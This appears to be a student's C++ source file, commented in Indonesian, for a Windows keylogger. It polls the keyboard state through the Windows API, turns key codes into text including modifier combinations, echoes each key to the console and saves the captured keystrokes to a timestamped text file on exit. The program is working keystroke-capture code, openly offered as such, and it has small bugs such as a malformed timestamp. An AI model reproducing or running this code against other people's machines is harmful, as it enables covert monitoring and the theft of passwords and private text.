/*----------------------------------------------------------------
 *  Author:     1.  Febi Agil Ifdillah - 13514010
 		2.  Rio Chandra - 13514082
 *  Written:       28/1/2016
 *  Last updated:  30/1/2016
 *
 *  Compilation:   g++ -o Keylogger Keylogger.cpp
 *  Execution:     ./Keylogger
 *
 *----------------------------------------------------------------*/


#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>
#include <sstream>
#include <ctime>
#include <windows.h>
/*
	PENJElASAN PENGGUNAAN SYSTEM CALLS WINDOWS API (WINAPI) YANG DIGUNAKAN
	
	Kedua fungsi dibawah memiliki parameter input
	
	GetAsyncKeyState(_In_ Code)
		API ini memberikan respon secara realtime (asinkronus) dari keadaan keyboard, misal ketika shift ditekan
		dan ditahan maka pemanggilan GetAsyncKeyState(VK_SHIFT) akan mengembalikan true namun
		ketika shift dilepas maka pemanggilan GetAsyncKeyState(VK_SHIFT) akan mngembalikan false.
		Sumber: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293%28v=vs.85%29.aspx
		
	GetKeyState(_In_ Code)
		API ini mirip dengan API diatas namun tidak realtime (asinkronus), misal ketika shift ditekan dan ditahan
		GetKeyState(VK_SHIFT) akan mengembalikan true dan ketika shift dilepas pemanggilan yang sama tetap menghasilkan
		true, namun ketika shift ditekan lagi maka pemanggilan GetKeyState(VK_SHIFT) mengembalikan true. Ini menunjukkan
		pemanggilan fungsi ini mirip tombol toggle (on/off). Ditekan sekali true ditekan lagi menjadi false, ditekan lagi
		menjadi true dan seterusnya.
		Sumber: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646301%28v=vs.85%29.aspx
*/

/*
	Issue sementara
		29 Januari 2016 22:05, "Penulisan ke file menggunakan string dataRekam masih bermasalah."
		29 Januari 2016 22:05, "fungsi olahKarakter belum mengembalikan karakter yang diinginkan --> belum diperbaiki, butuh perbaikan"
*/


using namespace std;

/* ----------------------------------------
* 				VARIABEL GLOBAL
* ----------------------------------------*/

// tempat menyimpan semua data rekaman keyboard
string dataRekam = "";
string filename;
ofstream outfile;

//Membuat Dynamic String
//tidak jadi
/* *******
* char *str, charac;
* int i =0, j =1;
* str
********* */

// mengembalikan bentuk karakter dari keyCode Keyboard
string olahKarakter(int kode, bool biasa){
	string keluar = "";
	switch(kode){
		case 0x08: return "(BACKSPACE)";
		case 0x03: return "(BREAK)";
		case 0x1B: return "(ESCAPE)";
		case 0x0D: return "(ENTER)";
		case 0x20: return " ";
		case 0x09: return "(TAB)";
		case 0x2E: return "(DELETE)";
		case 0x28: return "(BAWAH)";
		case 0x27: return "(KANAN)";
		case 0x26: return "(ATAS)";
		case 0x25: return "(KIRI)";
		case 0x70: return "F1";
		case 0x71: return "F2";
		case 0x72: return "F3";
		case 0x73: return "F4";
		case 0x74: return "F5";
		case 0x75: return "F6";
		case 0x76: return "F7";
		case 0x77: return "F8";
		case 0x78: return "F9";
		case 0x79: return "F10";
		case 0x7A: return "F11";
		case 0x7B: return "F12";
		case 0x24: return "(HOME)";
		case 0x23: return "(END)";
		case 0x22: return "(PAGE DOWN)";
		case 0x21: return "(PAGE UP)";
		case 0x91: return "(SCROLL LOCK)";
		case 0x2C: return "(PRINT SCREEN)";
		default: ;
	}
	if(biasa){
		if(kode >= 0x30 && kode <= 0x39){
			keluar += (char)kode;
			return keluar;
		}
		if(kode >= 0x41 && kode <= 0x5A){
			keluar += (char) (kode + 0x20);
			return keluar;
		}
		char ch;
		switch(kode){
			case 0xBA: ch = ';'; break;
			case 0xBF: ch = '/'; break;
			case 0xC0: ch = '`'; break;
			case 0xDB: ch = '['; break;
			case 0xDC: ch = '\\'; break;
			case 0xDD: ch = ']'; break;
			case 0xDE: ch = '\''; break;
			case 0xBC: ch = ','; break;
			case 0xBE: ch = '.'; break;
			case 0xBD: ch = '-'; break;
			case 0xBB: ch = '='; break;
		}
		keluar += ch;
	}else{
		if(kode >= 0x30 && kode <= 0x39){
			char ch;
			switch(kode){
				case 0x31: ch = '!'; break;
				case 0x32: ch = '@'; break;
				case 0x33: ch = '#'; break;
				case 0x34: ch = '$'; break;
				case 0x35: ch = '%'; break;
				case 0x36: ch = '^'; break;
				case 0x37: ch = '&'; break;
				case 0x38: ch = '*'; break;
				case 0x39: ch = '('; break;
				case 0x30: ch = ')'; break;
			}
			keluar += ch;
			return keluar;
		}
		if(kode >= 0x41 && kode <= 0x5A){
			keluar += (char) kode;
			return keluar;
		}
		char ch;
		switch(kode){
			case 0xBA: ch = ':'; break;
			case 0xBF: ch = '?'; break;
			case 0xC0: ch = '~'; break;
			case 0xDB: ch = '{'; break;
			case 0xDC: ch = '|'; break;
			case 0xDD: ch = '}'; break;
			case 0xDE: ch = '"'; break;
			case 0xBC: ch = '<'; break;
			case 0xBE: ch = '>'; break;
			case 0xBD: ch = '_'; break;
			case 0xBB: ch = '+'; break;
		}
		keluar += ch;
	}
	return keluar;
}

void TulisKeFile(){
	outfile.open(filename.c_str(), ios::out | ios::trunc);
	if (!outfile) {
		cerr << "Tidak bisa membuka file!" <<endl;
		abort();
	}
	//menulis string yang ada di dataRekam ke outfile.
	outfile << dataRekam.c_str();

	// menutup berkas
	outfile.close();
}

// mengembalikan true jika i adalah representasi kode dari Shift, Ctrl, atau Alt
bool kunciKhusus(int i){
	return 
		// Shift kiri & kanan
		i == 160 || i == 161 || 
		
		// Ctrl kiri & kanan
		i == 162 || i == 163 || 
		
		// Alt kiri & kanan
		i == 164 || i == 165 || 
		
		// Shift kiri-kanan
		i == 16 || 
		
		// Ctrl kiri-kanan
		i == 17 || 
		
		// Alt kiri-kanan
		i == 18;
}

// mengolah masukan dengan keyCode in dan keadaan Shift, Ctrl, Alt, dan Capslock diberikan
void olahMasukan(int in, bool tCtrl, bool tAlt, bool tShift, bool tCapslock){
	
	string masukan = "";

	// Ctrl dan Alt ditekan
		if(tCtrl && tAlt){
			masukan += "(CTRL+ALT+";
		}else{
			
			// Hanya Ctrl yang ditekan
			if(tCtrl){
				masukan += "(CTRL+";
			}else{
				
				// Hanya Alt yang ditekan
				if(tAlt){
					masukan += "(ALT+";
				}
			}
		}
	
		// Mode Shift dan Capslock tidak aktif (huruf kecil)
		if(!(tCapslock ^ tShift)){
			masukan += olahKarakter(in, true);
		}else{
			
			// Mode Shift atau Capslock aktif (huruf kapital)
			masukan += olahKarakter(in, false);
		}
		masukan += (tCtrl || tAlt ? ")" : "");
	
		cout << masukan;
	
		// menyimpan keluaran ke dalam string dataRekam;
		dataRekam += masukan;
		//cout << dataRekam << endl;
	}


// mulai merekam masukan keyboard
void mulaiRekam(){
	
	/* ------------------------------
	* Standard C
	* FILE *file;
	
	* // membuka berkas
	* if ((file = fopen(namaBerkas, "a+"))==NULL) {
	*	printf("Tidak bisa membuka file.\n");
        * exit(1);
	* }
	* -------------------------------- */
    time_t now = time(0);
	tm *ltm = localtime(&now);

	string tanggalWaktu;

	//konversi dari integer ke string
	stringstream syear, smon,sday,shour, smin,ssec;
	int year=1900+ltm->tm_year;
	int mon=1 + ltm->tm_mon;
	int day=ltm->tm_mday;
	int hour=1 + ltm->tm_hour;
	int min=1 + ltm->tm_min;
	int sec=1 + ltm->tm_sec;
	syear << year; string stryear=syear.str();
	smon << mon; string strmon=smon.str();
	sday << day; string strday=sday.str();
	shour << hour; string strhour=shour.str();
	smin << min; string strmin=smin.str();
	ssec << sec; string strsec=ssec.str();
	tanggalWaktu = stryear+strday+strhour+'-'+strhour+strmin+strsec;
	filename = tanggalWaktu + ".txt";

	// vkCode adalah variabel yang menyimpan keyCode yang diinput pengguna
	int vkCode = -1;
	
	// keyUp true artinya tombol yang baru ditekan dilepas
	bool keyUp = false;
	
	// Mengulang terus menerus
	while(!GetAsyncKeyState(VK_ESCAPE)){
		
		bool terlepas = true;
		bool tombolShift = GetAsyncKeyState(16);
		bool tombolCtrl = GetAsyncKeyState(17);
		bool tombolAlt = GetAsyncKeyState(18);
		bool tombolCapslock = GetKeyState(VK_CAPITAL);
		
		// Perulangan kemungkinan semua keycode Windows API sebanyak 2 byte = 256 keycode
		for(int keyCode = 1; keyCode < 0xFF; keyCode++){
		
			// Pengguna menekan keyboard dengan mengabaikan tombol Shift, Ctrl, dan Alt
			if((GetKeyState(keyCode) & 0x8000) && !kunciKhusus(keyCode)){
				
				// tombol dilepas (keyup)		
				terlepas = false;
				
				// pengguna menekan tombol yang berbeda dari tombol sebelumnya
				if(keyCode != vkCode){
					
					vkCode = keyCode;
					olahMasukan(vkCode, tombolCtrl, tombolAlt, tombolShift, tombolCapslock);
				}else{
					
					// pengguna menekan tombol yang sama berulang
					if(keyUp){
						
						olahMasukan(vkCode, tombolCtrl, tombolAlt, tombolShift, tombolCapslock);
						keyUp = false;
					}
				}				
				break;
			}
		}
		
		keyUp = terlepas;
	}
	
	// menulis rekaman/log
	TulisKeFile();
}

int main(){
	
	// mulai merekam aktivitas keyboard
	mulaiRekam();
	
	return 0;
}
